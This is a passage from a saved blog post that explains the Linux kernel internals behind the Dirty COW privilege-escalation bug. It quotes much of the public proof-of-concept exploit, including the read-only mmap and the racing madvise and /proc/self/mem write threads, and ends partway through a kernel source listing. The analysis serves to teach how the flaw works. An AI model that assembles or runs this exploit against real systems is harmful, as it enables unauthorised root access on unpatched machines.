<!DOCTYPE html>
<!-- saved from url=(0052)https://chao-tic.github.io/blog/2017/05/24/dirty-cow -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<title>Dirty COW and why lying is bad even if you are the Linux kernel</title>
			<!-- link to main stylesheet -->
			<link rel="stylesheet" type="text/css" href="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/main.css">
			<!-- google analytics -->
 			<script async="" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/analytics.js.下載"></script><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-99826492-1', 'auto');
  ga('send', 'pageview');

</script>
 
		<link rel="stylesheet" href="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/button.css"><script src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/embed.js.下載" data-timestamp="1638467899654"></script><link rel="prefetch" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.3e33cc45b553fa4f7fd3dfc49dc03ed0.css"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.2f2f40d40785c9541a90e9086c8770a3.js"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.2737369a2131ed319d0273590d7dc69d.js"><link rel="prefetch" as="script" href="https://disqus.com/next/config.js"><script async="" id="dsq_recs_scr" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/recommendations.js.下載"></script><link rel="prefetch" as="style" href="https://c.disquscdn.com/next/recommendations/styles/recommendations.10022a97346f1c6e3798931bbd8e4bb5.css"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/recommendations/common.bundle.6c6defcc206edabe5048d82459ee0a0e.js"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/recommendations/recommendations.bundle.926bc472e4859a48daa346b4ba2ab4f4.js"><link rel="prefetch" as="script" href="https://disqus.com/next/config.js"><script src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/alfie_v4.63f1ab6d6b9d5807dc0c94ef3fe0b851.js.下載" async="" charset="UTF-8"></script></head>
		<body>
			<nav>
	    		<ul>
	        		<li><a href="https://chao-tic.github.io/">Home</a></li>
	        		<li><a href="https://chao-tic.github.io/blog">Blog</a></li>
	        		<li><a href="https://chao-tic.github.io/blog/atom.xml">Atom</a></li>
	    		</ul>
			</nav>
			<div class="container">
			
			<h1>Dirty COW and why lying is bad even if you are the Linux kernel</h1>
<p class="meta">24 May 2017</p>



<div class="post">
  <p><a href="https://dirtycow.ninja/">Dirty COW (CVE-2016-5195)</a> is one of the most publicised local privilege escalation vulnerabilities in 2016, courtesy to its catchy name, cute logo, potential damages, and the fact that it was discovered in the wild by a researcher Phil Oester, meaning it was already under active use at the time of discovery.</p>

<h2 id="introduction">Introduction</h2>

<p>There have been plenty of articles and blog posts about the exploit, but none of them give a satisfactory explanation on exactly how Dirty COW works under the hood from the kernel’s perspective.</p>

<p>The following analysis is based on <a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">this attack POC</a>, although the idea applies to all other similar attacks.</p>

<p>The sample code is fairly short for an exploit, the important parts are the two threads: one calling <a href="http://man7.org/linux/man-pages/man2/write.2.html"><code class="highlighter-rouge">write(2)</code></a> on <code class="highlighter-rouge">/proc/self/mem</code>, and the other calling <code class="highlighter-rouge">madvise(MADV_DONTNEED)</code>. By having these two threads race against each other, a window of opportunity is revealed for the <code class="highlighter-rouge">write(2)</code> to push modification directly to the underlying memory mapped file even if said file is not allowed to be written by the attacking process, aka privilege escalation.</p>

<p>The post is a little heavy on the technical side, it assumes the readers have some basic understanding of the following concepts:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Virtual_memory">Virtual Memory</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Page_(computer_memory)">Pages</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Page_fault">Page Fault</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Copy-on-write#Copy-on-write_in_virtual_memory_management">Copy-on-Write</a></li>
</ul>

<!--break-->

<h2 id="how-to-carry-out-the-attack">How to carry out the attack</h2>

<p>With that said, let’s start from the beginning, first the code <code class="highlighter-rouge">open</code>s the file with read-only <code class="highlighter-rouge">O_RDONLY</code> flag, even though our intension is to ultimately “write” to it. This is to make the kernel happy as the file in question may not be writable for us the lowly unprivileged processes.</p>

<p>After successfully getting its hand on the file descriptor, it promptly <a href="http://man7.org/linux/man-pages/man2/mmap.2.html"><code class="highlighter-rouge">mmap</code></a>s the file:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">f</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="n">fstat</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
    <span class="n">name</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="cm">/*
    You have to use MAP_PRIVATE for copy-on-write mapping.
    &gt; Create a private copy-on-write mapping.  Updates to the
    &gt; mapping are not visible to other processes mapping the same
    &gt; file, and are not carried through to the underlying file.  It
    &gt; is unspecified whether changes made to the file after the
    &gt; mmap() call are visible in the mapped region.
    */</span>
    <span class="cm">/*
    You have to open with PROT_READ.
    */</span>
    <span class="n">map</span><span class="o">=</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span><span class="n">PROT_READ</span><span class="p">,</span><span class="n">MAP_PRIVATE</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>The invocation of <code class="highlighter-rouge">mmap</code> creates a file backed read-only memory mapping in the process’s virtual address space. This is managed via a kernel object called <a href="http://lxr.linux.no/linux+v4.8/include/linux/mm_types.h#L300"><code class="highlighter-rouge">struct vm_area_struct</code></a> (Virtual Memory Area), which carries information such as the underlying <a href="http://lxr.linux.no/linux+v4.8/include/linux/mm_types.h#L351">file description</a> backing the mapping, read/write permission for the mapped pages etc…</p>

<p>Then two racing threads are created, one to perform <code class="highlighter-rouge">madvise</code>, the other to call <code class="highlighter-rouge">write</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">madviseThread</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth2</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">procselfmemThread</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</code></pre></div></div>

<p>Let’s first take a look at what the <code class="highlighter-rouge">madvise</code> thread does:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">madviseThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
  <span class="n">str</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">100000000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
<span class="cm">/*
You have to race madvise(MADV_DONTNEED) :: <a class="vglnk" href="https://access.redhat.com/security/vulnerabilities/2706661" rel="nofollow"><span>https</span><span>://</span><span>access</span><span>.</span><span>redhat</span><span>.</span><span>com</span><span>/</span><span>security</span><span>/</span><span>vulnerabilities</span><span>/</span><span>2706661</span></a>
&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&gt; while having the page of the executable mmapped in memory.
*/</span>
    <span class="n">c</span><span class="o">+=</span><span class="n">madvise</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="n">MADV_DONTNEED</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"madvise %d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="n">c</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Essentially what <code class="highlighter-rouge">madvise(MADV_DONTNEED)</code> does is to purge the physical memory that’s managed by the mapping. In the case of COWed page, said page will be cleared after the call. The next time when the user attempts to access the memory region again, the pristine content will be reloaded from the disk (or page cache) for the file backed mappings or filled with zeros for anonymous heap memory.</p>

<p>See the documentation straight from <a href="http://man7.org/linux/man-pages/man2/madvise.2.html">the horse’s mouth</a>:</p>

<blockquote>
  <p><code class="highlighter-rouge">MADV_DONTNEED</code></p>

  <p>Do not expect access in the near future.  (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.)  Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from  the  underlying  mapped file (see <code class="highlighter-rouge">mmap(2)</code>) or zero-fill-on-demand pages for mappings without an underlying file</p>
</blockquote>

<p>The behaviour of <code class="highlighter-rouge">MADV_DONTNEED</code> on Linux is actually somewhat controversial and not compliant to the POSIX standard<sup id="fnref:madv"><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fn:madv" class="footnote">1</a></sup>. In fact as we will soon see it’s precisely this non-standard behaviour that makes Dirty COW possible.</p>

<p>Moving on to the other thread, here comes the meat of the attack:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">procselfmemThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
    <span class="n">str</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
    <span class="cm">/*
       You have to write to /proc/self/mem :: <a class="vglnk" href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16" rel="nofollow"><span>https</span><span>://</span><span>bugzilla</span><span>.</span><span>redhat</span><span>.</span><span>com</span><span>/</span><span>show</span><span>_</span><span>bug</span><span>.</span><span>cgi</span><span>?</span><span>id</span><span>=</span><span>1384344</span><span>#</span><span>c16</span></a>
       &gt;  The in the wild exploit we are aware of doesn't work on Red Hat
       &gt;  Enterprise Linux 5 and 6 out of the box because on one side of
       &gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
       &gt;  writable on Red Hat Enterprise Linux 5 and 6.
     */</span>
    <span class="kt">int</span> <span class="n">f</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/mem"</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">100000000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/*
           You have to reset the file pointer to the memory position.
         */</span>
        <span class="n">lseek</span><span class="p">(</span><span class="n">f</span><span class="p">,(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">map</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
        <span class="n">c</span><span class="o">+=</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">str</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"procselfmem %d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So it first <code class="highlighter-rouge">lseek</code>s to the address of <code class="highlighter-rouge">map</code>, then call <code class="highlighter-rouge">write(2)</code> so it can directly modify the memory region that belongs to the supposedly <em>read-only</em> memory mapping of the file? And somehow the modification will go through to the privileged file? But <em>how</em>???!!!</p>

<h2 id="write2-on-procpidmem"><code class="highlighter-rouge">write(2)</code> on <code class="highlighter-rouge">/proc/{pid}/mem</code></h2>

<p><code class="highlighter-rouge">/proc/{pid}/mem</code> is a <a href="http://man7.org/linux/man-pages/man5/proc.5.html">pseudo file</a> that provides a sort of out-of-band memory access to a process. Another example of this type of access is the venerable <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html"><code class="highlighter-rouge">ptrace(2)</code></a>, which is, unsurprisingly, an alternative attack vector of Dirty COW.</p>

<p>To see how writing to <code class="highlighter-rouge">proc/self/mem</code> works, we’ll need to burrow deeper into the kernel land. First by looking at how <code class="highlighter-rouge">write(2)</code> is implemented for this pseudo file.</p>

<p>In the land of kernel, file system operations are written in OOP style. Having one common abstract interface <code class="highlighter-rouge">struct file_operations</code>, different file types can provide specialised file operation implementation against the interface. For <code class="highlighter-rouge">/proc/{pid}/mem</code>, the definition can be found here at <a href="http://lxr.linux.no/linux+v4.8/fs/proc/base.c#L933"><code class="highlighter-rouge">/fs/proc/base.c</code></a>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">proc_mem_operations</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">llseek</span>  <span class="o">=</span> <span class="n">mem_lseek</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span>    <span class="o">=</span> <span class="n">mem_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span>   <span class="o">=</span> <span class="n">mem_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span>    <span class="o">=</span> <span class="n">mem_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">mem_release</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>When <code class="highlighter-rouge">write(2)</code> is applied to the pseudo file, the kernel will route the operation to <code class="highlighter-rouge">mem_write</code>, which is just a <a href="http://lxr.linux.no/linux+v4.8/fs/proc/base.c#L903">thin wrapper</a> for <a href="http://lxr.linux.no/linux+v4.8/fs/proc/base.c#L845"><code class="highlighter-rouge">mem_rw</code></a> who does most of the heavy lifting:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">mem_rw</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">write</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span> <span class="o">=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppos</span><span class="p">;</span>
    <span class="kt">ssize_t</span> <span class="n">copied</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mm</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* allocate an exchange buffer */</span>
    <span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">__get_free_page</span><span class="p">(</span><span class="n">GFP_TEMPORARY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>

    <span class="n">copied</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">atomic_inc_not_zero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">mm_users</span><span class="p">))</span>
        <span class="k">goto</span> <span class="n">free</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">this_len</span> <span class="o">=</span> <span class="n">min_t</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

        <span class="cm">/* copy user content to the exchange buffer */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">write</span> <span class="o">&amp;&amp;</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">this_len</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">this_len</span> <span class="o">=</span> <span class="n">access_remote_vm</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">this_len</span><span class="p">,</span> <span class="n">write</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this_len</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copied</span><span class="p">)</span>
                <span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">write</span> <span class="o">&amp;&amp;</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">this_len</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">buf</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
        <span class="n">copied</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
        <span class="n">count</span> <span class="o">-=</span> <span class="n">this_len</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">*</span><span class="n">ppos</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>

    <span class="n">mmput</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
<span class="nl">free:</span>
    <span class="n">free_page</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">page</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">copied</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The beginning of the function allocates a temporary memory buffer that serves as a sort of a data exchange centre between the calling process (i.e. the process performing the write) and the destination process (i.e. The process whose <code class="highlighter-rouge">/proc/self/mem</code> is being written). Though in this case the two processes are one and the same, the step is crucial for the more general use cases where the calling and destination processes are different, and one process has no direct access to another (hooray Virtual Memory).</p>

<p>It then copies the content of the calling process’s user buffer <code class="highlighter-rouge">buf</code> to the freshly allocated, but badly named exchange buffer <code class="highlighter-rouge">page</code><sup id="fnref:bad_name"><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fn:bad_name" class="footnote">2</a></sup>  using <code class="highlighter-rouge">copy_from_user</code>.</p>

<p>With the preparation done, here comes the real meat of <code class="highlighter-rouge">write</code> operation: <a href="http://lxr.linux.no/linux+v4.8/mm/memory.c#L3854"><code class="highlighter-rouge">access_remote_vm</code></a>. As the name implies, It allows the kernel to read from or write to the virtual memory space of another (remote) process. It’s the basis of all out-of-band memory access facilities (e.g. <code class="highlighter-rouge">ptrace(2)</code>, <code class="highlighter-rouge">/proc/self/mem</code>, <code class="highlighter-rouge">process_vm_readv</code>, <code class="highlighter-rouge">process_vm_writev</code>, etc…).</p>

<p><code class="highlighter-rouge">access_remote_vm</code> calls several intermediate functions that would eventually land at <a href="http://lxr.linux.no/linux+*/mm/gup.c#L728"><code class="highlighter-rouge">__get_user_pages_locked(...)</code></a> in which it first translates the intention of this out-of-band access to <code class="highlighter-rouge">flags</code>, in this case the flags would consist of:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FOLL_TOUCH | FOLL_REMOTE | FOLL_GET | FOLL_WRITE | FOLL_FORCE
</code></pre></div></div>

<p>These are called <code class="highlighter-rouge">gup_flags</code> (Get User Pages flags) or <code class="highlighter-rouge">foll_flags</code> (Follow flags), they encode information about why and in what way the caller wants to access or get the destination user memory pages. Let’s call it <em>access semantics</em>.</p>

<p>The <code class="highlighter-rouge">flags</code> and a bunch of other parameters are then passed to <code class="highlighter-rouge">__get_user_pages</code>, where the actual remote process memory access begins.</p>

<h2 id="__get_user_pages-and-faultin_page"><code class="highlighter-rouge">__get_user_pages</code> and <code class="highlighter-rouge">faultin_page</code></h2>

<p>The purpose of <a href="http://lxr.linux.no/linux+v4.8/mm/gup.c#L519"><code class="highlighter-rouge">__get_user_pages</code></a> is to find and pin a given virtual address range (in the remote process’s address space) to the kernel space. The pinning is necessary because without it, the user pages may not be present in the memory.</p>

<p>In some way <code class="highlighter-rouge">__get_user_pages</code> simulates what memory access in the user space does but directly in kernel land, complete with page fault handling using <a href="http://lxr.linux.no/linux+v4.8/mm/gup.c#L354"><code class="highlighter-rouge">faultin_page</code></a>.</p>

<p>Here is the snippet with the irrelevant parts removed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">long</span> <span class="nf">__get_user_pages</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span>
		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nr_pages</span><span class="p">,</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">gup_flags</span><span class="p">,</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">**</span><span class="n">pages</span><span class="p">,</span>
		<span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">**</span><span class="n">vmas</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">nonblocking</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/* ... snip ... */</span>

	<span class="k">do</span> <span class="p">{</span>
        <span class="cm">/* ... snip ... */</span>
<span class="nl">retry:</span>
		<span class="n">cond_resched</span><span class="p">();</span> <span class="cm">/* please rescheule me!!! */</span>
		<span class="n">page</span> <span class="o">=</span> <span class="n">follow_page_mask</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">foll_flags</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page_mask</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>
			<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="n">faultin_page</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">foll_flags</span><span class="p">,</span>
					<span class="n">nonblocking</span><span class="p">);</span>
			<span class="k">switch</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
				<span class="k">goto</span> <span class="n">retry</span><span class="p">;</span>
			<span class="k">case</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">:</span>
			<span class="k">case</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">:</span>
			<span class="k">case</span> <span class="o">-</span><span class="n">EHWPOISON</span><span class="p">:</span>
				<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="n">i</span> <span class="o">:</span> <span class="n">ret</span><span class="p">;</span>
			<span class="k">case</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">:</span>
				<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
			<span class="k">case</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">:</span>
				<span class="k">goto</span> <span class="n">next_page</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">BUG</span><span class="p">();</span>
		<span class="p">}</span> 
		<span class="k">if</span> <span class="p">(</span><span class="n">pages</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
			<span class="n">flush_anon_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">start</span><span class="p">);</span>
			<span class="n">flush_dcache_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
			<span class="n">page_mask</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
        <span class="cm">/* ... snip ... */</span>
    <span class="p">}</span>
	<span class="cm">/* ... snip ... */</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The code first attempts to locate the remote process’s memory <a href="https://en.wikipedia.org/wiki/Page_(computer_memory)">page</a> at the address <code class="highlighter-rouge">start</code> with <code class="highlighter-rouge">foll_flags</code> encoding memory access semantics. If the page is not available (<code class="highlighter-rouge">page == NULL</code>), suggesting either the page is not present or may need page fault to resolve the access. Thus <code class="highlighter-rouge">faultin_page</code> is called against the <code class="highlighter-rouge">start</code> address with the <code class="highlighter-rouge">foll_flags</code>, simulating a user memory access and trigger the page fault handler in the hope that the handler would “page” in the missing page.</p>

<p>There are several reasons why <code class="highlighter-rouge">follow_page_mask</code> returns <code class="highlighter-rouge">NULL</code>, here is a non-exhaustive list:</p>

<ul>
  <li>The address has no associated memory mapping, for example accessing <code class="highlighter-rouge">NULL</code> pointer.</li>
  <li>The memory mapping has been created, but because of <a href="https://en.wikipedia.org/wiki/Demand_paging">demand-paging</a>, the content has not yet been loaded in.</li>
  <li>The page has been paged out to the original file or swap file.</li>
  <li>The access semantics encoded in <code class="highlighter-rouge">foll_flags</code> violates the page’s permission configuration (i.e. writing to a read-only mapping).</li>
</ul>

<p>The last one is <strong>exactly</strong> what’s happening to our <code class="highlighter-rouge">write(2)</code> to <code class="highlighter-rouge">proc/self/mem</code>.</p>

<p>The genreal idea is that if the page fault handler can successfully resolve the fault and not complaining anything untoward, the function would then attempt another retry hoping to get a “valid” <code class="highlighter-rouge">page</code> to work with.</p>

<p>Notice the <code class="highlighter-rouge">retry</code> label and the use of <code class="highlighter-rouge">goto</code> here<sup id="fnref:goto"><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fn:goto" class="footnote">3</a></sup>? It may not be obvious, but as we will soon see, it is actually another important accomplice of this exploit.</p>

<p>With that in mind, let’s take a closer look at <code class="highlighter-rouge">faultin_page</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">faultin_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">nonblocking</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_mm</span><span class="p">;</span>
